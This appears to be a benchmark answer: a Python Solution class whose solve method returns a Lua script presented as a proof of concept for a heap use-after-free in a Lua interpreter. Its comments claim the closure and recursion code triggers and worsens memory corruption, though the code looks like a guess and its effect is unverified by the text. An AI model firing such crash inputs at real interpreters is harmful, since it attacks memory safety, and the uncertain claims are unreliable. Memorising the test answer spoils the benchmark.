class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """local _ENV: const = _ENV

-- Trigger incorrect code generation leading to heap UAF
do
    local function create_closure()
        local tbl = {}
        for i = 1, 1000 do
            tbl[i] = function() return i end
        end
        return tbl
    end
    local closures = create_closure()
    for i = 1, 1000 do
        closures[i]()
    end
end

-- Additional code to exacerbate memory issues
local function recursive(n)
    if n > 0 then
        local t = {recursive(n - 1)}
        return t
    end
    return nil
end

local deep = recursive(100)
print("Done")"""
        return poc.encode('utf-8')